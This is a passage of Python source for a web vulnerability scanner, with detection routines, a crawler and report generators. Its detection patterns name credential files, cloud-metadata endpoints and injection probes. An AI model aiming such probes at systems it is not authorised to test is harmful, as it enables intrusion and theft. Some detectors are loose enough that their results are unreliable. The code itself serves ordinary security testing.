            
            # Enhanced detection logic
            if check_type == 'xss':
                if self._detect_xss_advanced(payload, content, headers):
                    findings.append(self._create_finding('XSS', 'HIGH', f"Reflected XSS: {payload}", test_url))
                    
            elif check_type == 'sqli':
                if self._detect_sqli_advanced(payload, content, headers, status):
                    severity = 'CRITICAL' if any(x in payload.upper() for x in ['UNION', 'DROP', 'DELETE']) else 'HIGH'
                    findings.append(self._create_finding('SQL Injection', severity, f"SQL injection: {payload}", test_url))
                    
            elif check_type == 'lfi':
                if self._detect_lfi_advanced(payload, content, headers):
                    findings.append(self._create_finding('LFI', 'CRITICAL', f"Local File Inclusion: {payload}", test_url))
                    
            elif check_type == 'rfi' and status == 200 and len(content) > 100:
                findings.append(self._create_finding('RFI', 'CRITICAL', f"Potential RFI: {payload}", test_url))
                
            elif check_type == 'cmd_injection':
                if self._detect_cmd_injection_advanced(payload, content):
                    findings.append(self._create_finding('Command Injection', 'CRITICAL', f"Command injection: {payload}", test_url))
                    
            elif check_type == 'ssrf':
                if self._detect_ssrf_advanced(payload, content, status, final_url):
                    severity = 'CRITICAL' if any(x in payload for x in ['metadata', '169.254.169.254']) else 'HIGH'
                    findings.append(self._create_finding('SSRF', severity, f"SSRF to: {payload}", test_url))
                    
            elif check_type == 'sensitive_files' and status == 200:
                if self._detect_sensitive_file_advanced(payload, content):
                    severity = 'CRITICAL' if payload in ['.env', '.git/config', 'id_rsa'] else 'HIGH'
                    findings.append(self._create_finding('Sensitive File Exposure', severity, f"Exposed file: {payload}", test_url))
                    
            elif check_type == 'nosql_injection' and self._detect_nosql_advanced(content_lower, status):
                findings.append(self._create_finding('NoSQL Injection', 'HIGH', f"NoSQL injection: {payload}", test_url))
                
            elif check_type == 'ldap_injection' and self._detect_ldap_advanced(content_lower):
                findings.append(self._create_finding('LDAP Injection', 'HIGH', f"LDAP injection: {payload}", test_url))
                
            elif check_type == 'xpath_injection' and self._detect_xpath_advanced(content_lower):
                findings.append(self._create_finding('XPath Injection', 'HIGH', f"XPath injection: {payload}", test_url))
                
            elif check_type == 'open_redirect' and self._detect_open_redirect_advanced(payload, headers, status):
                findings.append(self._create_finding('Open Redirect', 'MEDIUM', f"Open redirect: {payload}", test_url))
                
            elif check_type == 'crlf_injection' and self._detect_crlf_advanced(payload, headers):
                findings.append(self._create_finding('CRLF Injection', 'HIGH', f"CRLF injection: {payload}", test_url))

        except Exception as e:
            self.config.logger.debug(f"Error checking {check_type}: {e}")
            
        return findings

    async def check_headers(self, url: str) -> List[Dict]:
        """Enhanced security headers check."""
        findings = []
        
        try:
            result = await self.session.get(url)
            if result[0] is None:
                return []
                
            status, headers, content, final_url = result
            
            headers_lower = {k.lower(): v for k, v in headers.items()}
            
            # Critical security headers
            critical_headers = {
                'strict-transport-security': 'HIGH',
                'content-security-policy': 'HIGH',
                'x-frame-options': 'MEDIUM',
                'x-content-type-options': 'LOW',
                'x-xss-protection': 'LOW',
                'referrer-policy': 'LOW'
            }
            
            for header, severity in critical_headers.items():
                if header not in headers_lower:
                    findings.append(self._create_finding(
                        'Missing Security Header',
                        severity,
                        f"Missing security header: {header}",
                        url
                    ))
            
        except Exception as e:
            self.config.logger.debug(f"Header check error: {e}")
            
        return findings

    async def _check_post_vulnerability(self, url: str, check_type: str, payload: str) -> List[Dict]:
        """Handle POST-based vulnerability checks."""
        findings = []
        
        try:
            if check_type == 'xxe':
                headers = {'Content-Type': 'application/xml'}
                status, resp_headers, content, final_url = await self.session.post(url, data=payload, headers=headers)
                if self._detect_xxe_advanced(payload, content, resp_headers):
                    findings.append(self._create_finding('XXE', 'CRITICAL', f"XML External Entity injection detected", url))
            
            elif check_type == 'template_injection':
                data = {'template': payload, 'content': payload, 'data': payload}
                status, resp_headers, content, final_url = await self.session.post(url, data=data)
                if self._detect_template_injection_advanced(payload, content):
                    findings.append(self._create_finding('Template Injection', 'CRITICAL', f"Template injection: {payload}", url))
        
        except Exception as e:
            self.config.logger.debug(f"POST vulnerability check error: {e}")
            
        return findings

    # Enhanced detection methods
    def _detect_xss_advanced(self, payload: str, content: str, headers: Dict) -> bool:
        """Advanced XSS detection."""
        # Direct reflection
        if payload in content:
            return True
        
        # HTML entity encoded reflection
        try:
            import html
            if html.escape(payload) in content:
                return True
        except:
            pass
        
        # XSS indicators
        xss_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(']
        return any(indicator in content.lower() for indicator in xss_indicators)

    def _detect_sqli_advanced(self, payload: str, content: str, headers: Dict, status: int) -> bool:
        """Advanced SQL injection detection."""
        content_lower = content.lower()
        
        # Enhanced database error patterns
        sql_errors = [
            'mysql error', 'sql syntax', 'syntax error', 'database error',
            'ora-', 'postgresql', 'sqlite error', 'mssql', 'odbc error',
            'you have an error in your sql syntax', 'mysql_fetch_array',
            'pg_query', 'sqlstate', 'invalid query', 'query failed'
        ]
        
        return any(error in content_lower for error in sql_errors)

    def _detect_lfi_advanced(self, payload: str, content: str, headers: Dict) -> bool:
        """Advanced LFI detection."""
        content_lower = content.lower()
        
        # Enhanced file indicators
        file_indicators = [
            'root:x:0:0:', '/bin/bash', '/bin/sh', '[boot loader]',
            'daemon:x:', 'nobody:x:', 'www-data:x:', 'system32',
            'mysql_connect', 'database_host', 'api_key'
        ]
        
        return any(indicator in content_lower for indicator in file_indicators)

    def _detect_cmd_injection_advanced(self, payload: str, content: str) -> bool:
        """Advanced command injection detection."""
        content_lower = content.lower()
        
        # Enhanced command indicators
        cmd_indicators = [
            'uid=', 'gid=', 'groups=', 'www-data', 'apache', 'nginx',
            'volume in drive', 'directory of', 'total', '-rw-r--r--',
            'ping statistics', 'packets transmitted'
        ]
        
        return any(indicator in content_lower for indicator in cmd_indicators)

    def _detect_ssrf_advanced(self, payload: str, content: str, status: int, final_url: str) -> bool:
        """Advanced SSRF detection."""
        content_lower = content.lower()
        
        # Cloud metadata indicators
        cloud_indicators = [
            'instance-id', 'ami-id', 'computemetadata', 'metadata.azure.com',
            'latest/meta-data', 'security-credentials'
        ]
        
        return any(indicator in content_lower for indicator in cloud_indicators)

    def _detect_sensitive_file_advanced(self, filename: str, content: str) -> bool:
        """Advanced sensitive file detection."""
        if len(content) < 20:
            return False
            
        content_lower = content.lower()
        sensitive_indicators = [
            'password', 'secret', 'api_key', 'private_key', 'config',
            'database', 'connection', 'smtp', 'aws_access_key'
        ]
        
        return any(indicator in content_lower for indicator in sensitive_indicators)

    def _detect_nosql_advanced(self, content_lower: str, status: int) -> bool:
        """Advanced NoSQL injection detection."""
        return any(indicator in content_lower for indicator in ['mongodb', 'bson', 'objectid'])

    def _detect_ldap_advanced(self, content_lower: str) -> bool:
        """Advanced LDAP injection detection."""
        return any(indicator in content_lower for indicator in ['ldap error', 'cn=', 'ou='])

    def _detect_xpath_advanced(self, content_lower: str) -> bool:
        """Advanced XPath injection detection."""
        return any(indicator in content_lower for indicator in ['xpath error', 'xpath syntax'])

    def _detect_open_redirect_advanced(self, payload: str, headers: Dict, status: int) -> bool:
        """Advanced open redirect detection."""
        if status in [301, 302, 303, 307, 308]:
            location = headers.get('location', '').lower()
            return payload.lower() in location
        return False

    def _detect_crlf_advanced(self, payload: str, headers: Dict) -> bool:
        """Advanced CRLF injection detection."""
        return '\r\n' in payload and any('injected' in str(v).lower() for v in headers.values())

    def _detect_xxe_advanced(self, payload: str, content: str, headers: Dict) -> bool:
        """Advanced XXE detection."""
        content_lower = content.lower()
        xxe_indicators = ['root:x:0:0:', '/etc/passwd', 'boot.ini', 'xml parsing error']
        return any(indicator in content_lower for indicator in xxe_indicators)

    def _detect_template_injection_advanced(self, payload: str, content: str) -> bool:
        """Advanced template injection detection."""
        # Check for mathematical expressions
        if '{{7*7}}' in payload and '49' in content:
            return True
        if '${7*7}' in payload and '49' in content:
            return True
        if '<%=7*7%>' in payload and '49' in content:
            return True
        
        # Check for other template indicators
        template_indicators = ['config', 'template', 'render']
        return any(indicator in content.lower() for indicator in template_indicators)

    # Technology detection helpers
    def _detect_technologies(self, content: str, headers: Dict) -> List[str]:
        """Detect technologies used."""
        technologies = []
        content_lower = content.lower()
        headers_str = str(headers).lower()
        
        tech_indicators = {
            'WordPress': ['wp-content', 'wp-includes'],
            'Drupal': ['drupal', '/sites/default/'],
            'Joomla': ['joomla', '/components/'],
            'React': ['react', '_reactInternalFiber'],
            'Vue.js': ['vue.js', '__vue__'],
            'Angular': ['angular', 'ng-'],
            'jQuery': ['jquery', '$'],
            'Bootstrap': ['bootstrap'],
            'PHP': ['php'],
            'ASP.NET': ['asp.net', 'aspnet'],
            'Node.js': ['node', 'express']
        }
        
        for tech, indicators in tech_indicators.items():
            if any(indicator in content_lower or indicator in headers_str for indicator in indicators):
                technologies.append(tech)
        
        return technologies

    def _detect_cms_simple(self, content: str, headers: Dict) -> str:
        """Simple CMS detection."""
        content_lower = content.lower()
        
        if 'wp-content' in content_lower or 'wp-includes' in content_lower:
            return 'WordPress'
        elif 'drupal' in content_lower:
            return 'Drupal'
        elif 'joomla' in content_lower:
            return 'Joomla'
        elif 'shopify' in content_lower:
            return 'Shopify'
        
        return 'Unknown'

    def _detect_js_frameworks_simple(self, content: str) -> List[str]:
        """Simple JavaScript framework detection."""
        frameworks = []
        content_lower = content.lower()
        
        if 'react' in content_lower:
            frameworks.append('React')
        if 'vue' in content_lower:
            frameworks.append('Vue.js')
        if 'angular' in content_lower:
            frameworks.append('Angular')
        if 'jquery' in content_lower:
            frameworks.append('jQuery')
        
        return frameworks

    def _create_finding(self, type: str, severity: str, details: str, url: str) -> Dict:
        """Create a comprehensive vulnerability finding."""
        return {
            'type': type,
            'severity': severity,
            'details': details,
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'description': f"{type} vulnerability found: {details}",
            'remediation': self._get_remediation_advice(type),
            'risk_score': self._calculate_risk_score(severity),
            'impact': self._get_impact_description(type, severity)
        }

    def _get_remediation_advice(self, vuln_type: str) -> str:
        """Get remediation advice for vulnerability type."""
        remediation_map = {
            'XSS': 'Implement proper input validation and output encoding. Use CSP headers.',
            'SQL Injection': 'Use parameterized queries and prepared statements. Validate input.',
            'LFI': 'Validate and sanitize file paths. Use whitelist approach for allowed files.',
            'Command Injection': 'Avoid system calls with user input. Use parameterized APIs.',
            'SSRF': 'Validate URLs against whitelist. Disable unnecessary URL schemes.',
            'Sensitive File Exposure': 'Remove sensitive files from web root. Configure proper access controls.',
            'Missing Security Header': 'Configure appropriate security headers in web server.',
            'Open Redirect': 'Validate redirect URLs against whitelist of allowed domains.',
            'CRLF Injection': 'Sanitize input to remove CR/LF characters.',
            'Template Injection': 'Sanitize template input and use safe template engines.',
            'XXE': 'Disable external entity processing in XML parsers.'
        }
        
        return remediation_map.get(vuln_type, 'Review and fix the identified security issue.')

    def _calculate_risk_score(self, severity: str) -> int:
        """Calculate numerical risk score."""
        risk_scores = {
            'CRITICAL': 9,
            'HIGH': 7,
            'MEDIUM': 5,
            'LOW': 3,
            'INFO': 1
        }
        
        return risk_scores.get(severity, 5)

    def _get_impact_description(self, vuln_type: str, severity: str) -> str:
        """Get impact description for vulnerability."""
        impact_map = {
            'XSS': 'Session hijacking, data theft, defacement',
            'SQL Injection': 'Data breach, unauthorized access, data manipulation',
            'LFI': 'Information disclosure, potential code execution',
            'Command Injection': 'Full system compromise, data breach',
            'SSRF': 'Internal network access, cloud metadata exposure',
            'Sensitive File Exposure': 'Configuration disclosure, credential exposure'
        }
        
        base_impact = impact_map.get(vuln_type, 'Security compromise')
        
        if severity in ['CRITICAL', 'HIGH']:
            return f"HIGH IMPACT: {base_impact}"
        elif severity == 'MEDIUM':
            return f"MEDIUM IMPACT: {base_impact}"
        else:
            return f"LOW IMPACT: {base_impact}"


# --- Simple Crawling Function ---

async def simple_crawl(session: AsyncSession, url: str, max_depth: int = 1) -> Set[str]:
    """Simple URL crawling function."""
    found_urls = {url}
    
    try:
        result = await session.get(url)
        if result[0] is None:
            return found_urls
            
        status, headers, content, final_url = result
        
        if BS4_AVAILABLE:
            soup = BeautifulSoup(content, 'html.parser')
            links = soup.find_all('a', href=True)
            
            for link in links:
                href = link['href']
                full_url = urljoin(url, href)
                parsed = urlparse(full_url)
                
                # Only include URLs from same domain
                if parsed.netloc == urlparse(url).netloc:
                    found_urls.add(full_url)
        
    except Exception as e:
        pass
    
    return found_urls


# --- Report Generation Functions ---

def generate_report(results):
    """Generate comprehensive JSON report."""
    if not results:
        return None
    
    # Aggregate all findings
    all_findings = []
    for result in results:
        all_findings.extend(result.get('findings', []))
    
    # Calculate summary statistics
    severity_counts = {
        'CRITICAL': len([f for f in all_findings if f.get('severity') == 'CRITICAL']),
        'HIGH': len([f for f in all_findings if f.get('severity') == 'HIGH']), 
        'MEDIUM': len([f for f in all_findings if f.get('severity') == 'MEDIUM']),
        'LOW': len([f for f in all_findings if f.get('severity') == 'LOW'])
    }
    
    report = {
        'scan_info': {
            'timestamp': datetime.now().isoformat(),
            'scanner': 'DuskProbe v5.0 Streamlit',
            'urls_scanned': len(results),
            'total_findings': len(all_findings)
        },
        'summary': {
            'severity_breakdown': severity_counts,
            'risk_level': 'CRITICAL' if severity_counts['CRITICAL'] > 0 else 
                         'HIGH' if severity_counts['HIGH'] > 0 else
                         'MEDIUM' if severity_counts['MEDIUM'] > 0 else
                         'LOW' if severity_counts['LOW'] > 0 else 'CLEAN'
        },
        'detailed_results': results,
        'findings': all_findings
    }
    
    return report

def generate_csv_report(results):
    """Generate CSV report using pandas."""
    if not results or not PD_AVAILABLE:
        return ""
    
    # Flatten all findings into a list of dictionaries
    csv_data = []
    for result in results:
        url = result.get('url', 'Unknown')
        findings = result.get('findings', [])
        
        for finding in findings:
            csv_data.append({
                'URL': url,
                'Vulnerability_Type': finding.get('type', 'Unknown'),
                'Severity': finding.get('severity', 'Unknown'),
                'Details': finding.get('details', 'No details'),
                'Vulnerable_URL': finding.get('url', url),
                'Timestamp': finding.get('timestamp', ''),
                'Description': finding.get('description', '')
            })
    
    if not csv_data:
        # If no findings, create summary row
        csv_data = [{
            'URL': ', '.join([r.get('url', 'Unknown') for r in results]),
            'Vulnerability_Type': 'SCAN_SUMMARY',
            'Severity': 'INFO', 
            'Details': 'No vulnerabilities found',
            'Vulnerable_URL': '',
            'Timestamp': datetime.now().isoformat(),
            'Description': f'Scan completed for {len(results)} URLs with no vulnerabilities detected'
        }]
    
    df = pd.DataFrame(csv_data)
    return df.to_csv(index=False)

def generate_html_report(results):
    """Generate comprehensive HTML report with all CLI-equivalent sections."""
    if not results:
        return ""
    
    # Calculate summary statistics
    all_findings = []
    for result in results:
        all_findings.extend(result.get('findings', []))
    
    severity_counts = {
        'CRITICAL': len([f for f in all_findings if f.get('severity') == 'CRITICAL']),
        'HIGH': len([f for f in all_findings if f.get('severity') == 'HIGH']),
        'MEDIUM': len([f for f in all_findings if f.get('severity') == 'MEDIUM']),
        'LOW': len([f for f in all_findings if f.get('severity') == 'LOW']),
        'INFO': len([f for f in all_findings if f.get('severity') == 'INFO'])
    }
    
    # Group vulnerabilities for analysis
    vuln_analysis = {}
    for vuln in all_findings:
        vuln_type = vuln.get('type', 'Unknown')
        if vuln_type not in vuln_analysis:
            vuln_analysis[vuln_type] = {'count': 0, 'examples': []}
        vuln_analysis[vuln_type]['count'] += 1
        if len(vuln_analysis[vuln_type]['examples']) < 3:
            vuln_analysis[vuln_type]['examples'].append(vuln)
    
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>DuskProbe Security Scan Report</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; background-color: #f8f9fa; }}
            .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
            .header {{ background: linear-gradient(135deg, #2E86AB, #A23B72); color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; text-align: center; }}
            .header h1 {{ font-size: 2.5em; margin-bottom: 10px; }}
            .header p {{ font-size: 1.1em; opacity: 0.9; }}
            
            .section {{ background: white; padding: 25px; margin: 20px 0; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            .section h2 {{ color: #2E86AB; font-size: 1.8em; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #e9ecef; }}
            .section h3 {{ color: #495057; font-size: 1.4em; margin: 20px 0 15px 0; }}
            
            .summary-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
            .metric-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border-left: 4px solid #2E86AB; }}
            .metric-value {{ font-size: 2em; font-weight: bold; }}
            .metric-label {{ font-size: 0.9em; color: #6c757d; margin-top: 5px; }}
            
            .critical {{ color: #dc3545; }}
            .high {{ color: #fd7e14; }}
            .medium {{ color: #ffc107; }}
            .low {{ color: #20c997; }}
            .info {{ color: #17a2b8; }}
            
            table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
            th, td {{ border: 1px solid #dee2e6; padding: 12px; text-align: left; }}
            th {{ background: linear-gradient(135deg, #f8f9fa, #e9ecef); font-weight: 600; }}
            tr:nth-child(even) {{ background-color: #f8f9fa; }}
            
            .vulnerability-card {{ border-left: 4px solid #dee2e6; margin: 15px 0; padding: 15px; background: #f8f9fa; border-radius: 5px; }}
            .vulnerability-card.critical {{ border-left-color: #dc3545; }}
            .vulnerability-card.high {{ border-left-color: #fd7e14; }}
            .vulnerability-card.medium {{ border-left-color: #ffc107; }}
            .vulnerability-card.low {{ border-left-color: #20c997; }}
            
            .code {{ background: #f1f3f4; padding: 10px; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 0.9em; overflow-x: auto; }}
            .badge {{ display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 0.8em; font-weight: 500; }}
            .badge-critical {{ background-color: #f8d7da; color: #721c24; }}
            .badge-high {{ background-color: #fce4d6; color: #8a4616; }}
            .badge-medium {{ background-color: #fff3cd; color: #856404; }}
            .badge-low {{ background-color: #d1ecf1; color: #0c5460; }}
            .badge-info {{ background-color: #d4edda; color: #155724; }}
            
            .navigation {{ position: sticky; top: 20px; background: white; padding: 15px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px; }}
            .nav-link {{ display: inline-block; margin-right: 15px; padding: 8px 15px; background: #e9ecef; color: #495057; text-decoration: none; border-radius: 5px; font-size: 0.9em; }}
            .nav-link:hover {{ background: #2E86AB; color: white; }}
            
            .footer {{ background: #343a40; color: white; padding: 20px; text-align: center; border-radius: 10px; margin-top: 30px; }}
            
            @media (max-width: 768px) {{
                .summary-grid {{ grid-template-columns: 1fr; }}
                .header h1 {{ font-size: 2em; }}
                .section {{ padding: 15px; }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔍 DuskProbe Security Assessment Report</h1>
                <p>Comprehensive Web Application Security Analysis</p>
                <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')} | Scanner: DuskProbe v5.0 Streamlit Edition</p>
            </div>
            
            <div class="navigation">
                <a href="#summary" class="nav-link">📊 Executive Summary</a>
                <a href="#detailed-analysis" class="nav-link">🔍 Detailed Analysis</a>
                <a href="#technical-intelligence" class="nav-link">🛡️ Technical Intelligence</a>
                <a href="#vulnerability-analysis" class="nav-link">🎯 Vulnerability Analysis</a>
                <a href="#remediation" class="nav-link">🛠️ Remediation Guide</a>
                <a href="#appendix" class="nav-link">📋 Appendix</a>
            </div>
            
            <div class="section" id="summary">
                <h2>📊 Executive Summary</h2>
                
                <div class="summary-grid">
                    <div class="metric-card">
                        <div class="metric-value">{len(results)}</div>
                        <div class="metric-label">URLs Scanned</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-value critical">{severity_counts['CRITICAL']}</div>
                        <div class="metric-label">Critical Issues</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-value high">{severity_counts['HIGH']}</div>
                        <div class="metric-label">High Risk Issues</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-value medium">{severity_counts['MEDIUM']}</div>
                        <div class="metric-label">Medium Risk Issues</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-value low">{severity_counts['LOW']}</div>
                        <div class="metric-label">Low Risk Issues</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-value">{len(all_findings)}</div>
                        <div class="metric-label">Total Findings</div>
                    </div>
                </div>
                
                <h3>🎯 Security Assessment Overview</h3>
                <table>
                    <tr><th>Assessment Criteria</th><th>Result</th><th>Status</th></tr>
                    <tr>
                        <td>Overall Risk Level</td>
                        <td>{"🔴 CRITICAL" if severity_counts['CRITICAL'] > 0 else "🟠 HIGH" if severity_counts['HIGH'] > 0 else "🟡 MEDIUM" if severity_counts['MEDIUM'] > 0 else "🟢 LOW"}</td>
                        <td>{"Immediate attention required" if severity_counts['CRITICAL'] > 0 else "Action needed" if severity_counts['HIGH'] > 0 else "Monitor closely" if severity_counts['MEDIUM'] > 0 else "Acceptable"}</td>
                    </tr>
                    <tr>
                        <td>Vulnerability Types Detected</td>
                        <td>{len(vuln_analysis)}</td>
                        <td>{"Diverse attack surface" if len(vuln_analysis) > 5 else "Moderate diversity" if len(vuln_analysis) > 2 else "Limited scope"}</td>
                    </tr>
                    <tr>
                        <td>URLs with Issues</td>
                        <td>{len([r for r in results if r.get('findings')])}</td>
                        <td>{"Widespread issues" if len([r for r in results if r.get('findings')]) > len(results) * 0.7 else "Scattered issues" if len([r for r in results if r.get('findings')]) > len(results) * 0.3 else "Isolated issues"}</td>
                    </tr>
                </table>
            </div>
            
            <div class="section" id="detailed-analysis">
                <h2>🔍 Detailed Security Analysis</h2>
    """
    
    # Add vulnerability analysis table
    if all_findings:
        html_content += """
                <h3>🎯 Comprehensive Vulnerability Matrix</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Severity</th>
                            <th>Vulnerability Type</th>
                            <th>URL</th>
                            <th>Payload</th>
                            <th>Details</th>
                            <th>Timestamp</th>
                            <th>Risk Score</th>
                        </tr>
                    </thead>
                    <tbody>
        """
        
        # Sort findings by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
        sorted_findings = sorted(all_findings, key=lambda x: severity_order.get(x.get('severity', 'INFO'), 5))
        
        for finding in sorted_findings:
            severity = finding.get('severity', 'INFO')
            risk_score = {'CRITICAL': 25, 'HIGH': 15, 'MEDIUM': 8, 'LOW': 3, 'INFO': 1}.get(severity, 1)
            
            html_content += f"""
                        <tr>
                            <td><span class="badge badge-{severity.lower()}">{severity}</span></td>
                            <td>{finding.get('type', 'Unknown')}</td>
                            <td><code style="font-size: 0.8em;">{finding.get('url', 'N/A')[:50]}{'...' if len(finding.get('url', '')) > 50 else ''}</code></td>
                            <td><code style="font-size: 0.8em;">{finding.get('payload', 'N/A')[:40]}{'...' if len(finding.get('payload', '')) > 40 else ''}</code></td>
                            <td>{finding.get('details', 'No details')[:100]}{'...' if len(finding.get('details', '')) > 100 else ''}</td>
                            <td>{finding.get('timestamp', 'Unknown')}</td>
                            <td>{risk_score}</td>
                        </tr>
            """
        
        html_content += """
                    </tbody>
                </table>
        """
    
    # Add technical intelligence section
    html_content += f"""
            </div>
            
            <div class="section" id="technical-intelligence">
                <h2>🛡️ Technical Intelligence & Infrastructure Analysis</h2>
                
                <h3>🌐 Target Infrastructure Overview</h3>
                <table>
                    <thead>
                        <tr><th>URL</th><th>Status</th><th>Server</th><th>Technology Stack</th><th>Security Headers</th></tr>
                    </thead>
                    <tbody>
    """
    
    for result in results:
        site_info = result.get('site_info', {})
        url = result.get('url', 'Unknown')
        status_code = site_info.get('status_code', 'Unknown')
        server = site_info.get('server', 'Unknown')
        
        # Analyze security headers
        security_headers = site_info.get('security_headers', {})
        present_headers = len([k for k, v in security_headers.items() if v != 'Missing'])
        total_headers = len(security_headers)
        header_score = f"{present_headers}/{total_headers}" if total_headers > 0 else "N/A"
        
        html_content += f"""
                        <tr>
                            <td><code>{url[:60]}{'...' if len(url) > 60 else ''}</code></td>
                            <td>{"✅" if str(status_code).startswith('2') else "⚠️" if str(status_code).startswith('3') else "❌"} {status_code}</td>
                            <td>{server}</td>
                            <td>Analysis Available</td>
                            <td>{header_score} headers</td>
                        </tr>
        """
    
    html_content += """
                    </tbody>
                </table>
            </div>
            
            <div class="section" id="vulnerability-analysis">
                <h2>🎯 Advanced Vulnerability Analysis</h2>
                
                <h3>📊 Vulnerability Type Distribution</h3>
                <table>
                    <thead>
                        <tr><th>Vulnerability Type</th><th>Count</th><th>Percentage</th><th>Risk Level</th><th>Priority</th></tr>
                    </thead>
                    <tbody>
    """
    
    # Add vulnerability type analysis
    total_vulns = len(all_findings)
    sorted_vuln_types = sorted(vuln_analysis.items(), key=lambda x: x[1]['count'], reverse=True)
    
    for vuln_type, data in sorted_vuln_types:
        count = data['count']
        percentage = (count / total_vulns * 100) if total_vulns > 0 else 0
        
        # Determine risk level based on vulnerability type and count
        if vuln_type.upper() in ['XSS', 'SQL INJECTION', 'COMMAND INJECTION']:
            risk_level = "🔴 HIGH"
            priority = "1"
        elif count > 5:
            risk_level = "🟠 MEDIUM-HIGH"
            priority = "2"
        elif count > 2:
            risk_level = "🟡 MEDIUM"
            priority = "3"
        else:
            risk_level = "🟢 LOW"
            priority = "4"
        
        html_content += f"""
                        <tr>
                            <td><strong>{vuln_type}</strong></td>
                            <td>{count}</td>
                            <td>{percentage:.1f}%</td>
                            <td>{risk_level}</td>
                            <td>P{priority}</td>
                        </tr>
        """
    
    html_content += f"""
                    </tbody>
                </table>
                
                <h3>🔍 Per-URL Risk Assessment</h3>
                <table>
                    <thead>
                        <tr><th>URL</th><th>Total Issues</th><th>Risk Score</th><th>Status</th><th>Recommendation</th></tr>
                    </thead>
                    <tbody>
    """
    
    # Add per-URL analysis
    for result in results:
        url = result.get('url', 'Unknown')
        findings = result.get('findings', [])
        issue_count = len(findings)
        
        # Calculate risk score
        risk_score = sum([
            25 if f.get('severity') == 'CRITICAL' else
            15 if f.get('severity') == 'HIGH' else
            8 if f.get('severity') == 'MEDIUM' else
            3 if f.get('severity') == 'LOW' else 1
            for f in findings
        ])
        
        if risk_score >= 50:
            status = "🔴 CRITICAL"
            recommendation = "Immediate action required"
        elif risk_score >= 25:
            status = "🟠 HIGH RISK"
            recommendation = "Address within 24-48 hours"
        elif risk_score >= 10:
            status = "🟡 MEDIUM RISK"
            recommendation = "Address within 1 week"
        else:
            status = "🟢 LOW RISK"
            recommendation = "Monitor and maintain"
        
        html_content += f"""
                        <tr>
                            <td><code>{url[:50]}{'...' if len(url) > 50 else ''}</code></td>
                            <td>{issue_count}</td>
                            <td>{risk_score}</td>
                            <td>{status}</td>
                            <td>{recommendation}</td>
                        </tr>
        """
    
    html_content += f"""
                    </tbody>
                </table>
            </div>
            
            <div class="section" id="remediation">
                <h2>🛠️ Remediation Guide & Security Recommendations</h2>
                
                <h3>🎯 Priority-Based Action Plan</h3>
    """
    
    # Add remediation recommendations for each vulnerability type
    priority_order = []
    for vuln_type, data in vuln_analysis.items():
        # Calculate priority score
        examples = data['examples']
        priority_score = sum([
            25 if ex.get('severity') == 'CRITICAL' else
            15 if ex.get('severity') == 'HIGH' else
            8 if ex.get('severity') == 'MEDIUM' else
            3 if ex.get('severity') == 'LOW' else 1
            for ex in examples
        ])
        priority_order.append((vuln_type, data, priority_score))
    
    # Sort by priority
    priority_order.sort(key=lambda x: x[2], reverse=True)
    
    for idx, (vuln_type, data, priority_score) in enumerate(priority_order, 1):
        priority_level = "🔴 CRITICAL" if priority_score >= 50 else "🟠 HIGH" if priority_score >= 25 else "🟡 MEDIUM" if priority_score >= 10 else "🟢 LOW"
        
        html_content += f"""
                <div class="vulnerability-card {priority_level.split()[1].lower() if len(priority_level.split()) > 1 else 'info'}">
                    <h4>Priority #{idx} - {priority_level} - {vuln_type} ({data['count']} instances)</h4>
                    <p><strong>Priority Score:</strong> {priority_score}</p>
                    <p><strong>Immediate Actions:</strong></p>
                    <ul>
                        <li>Review and validate all instances of {vuln_type}</li>
                        <li>Implement appropriate security controls</li>
                        <li>Test fixes thoroughly before deployment</li>
                        <li>Monitor for similar vulnerabilities</li>
                    </ul>
                </div>
        """
    
    html_content += """
                <h3>🔒 General Security Recommendations</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                    <div class="vulnerability-card info">
                        <h4>🛡️ Defense in Depth</h4>
                        <ul>
                            <li>Implement Web Application Firewall (WAF)</li>
                            <li>Use Content Security Policy headers</li>
                            <li>Enable security headers (HSTS, X-Frame-Options)</li>
                            <li>Regular security updates and patching</li>
                        </ul>
                    </div>
                    
                    <div class="vulnerability-card info">
                        <h4>🔍 Continuous Monitoring</h4>
                        <ul>
                            <li>Implement security logging and monitoring</li>
                            <li>Regular vulnerability assessments</li>
                            <li>Automated security testing in CI/CD</li>
                            <li>Security incident response plan</li>
                        </ul>
                    </div>
                    
                    <div class="vulnerability-card info">
                        <h4>👨‍💻 Development Practices</h4>
                        <ul>
                            <li>Secure coding training for developers</li>
                            <li>Code review and static analysis</li>
                            <li>Input validation and output encoding</li>
                            <li>Principle of least privilege</li>
                        </ul>
                    </div>
                    
                    <div class="vulnerability-card info">
                        <h4>🏗️ Infrastructure Security</h4>
                        <ul>
                            <li>Network segmentation and firewall rules</li>
                            <li>Regular backup and disaster recovery testing</li>
                            <li>SSL/TLS configuration and certificate management</li>
                            <li>Access control and authentication mechanisms</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <div class="section" id="appendix">
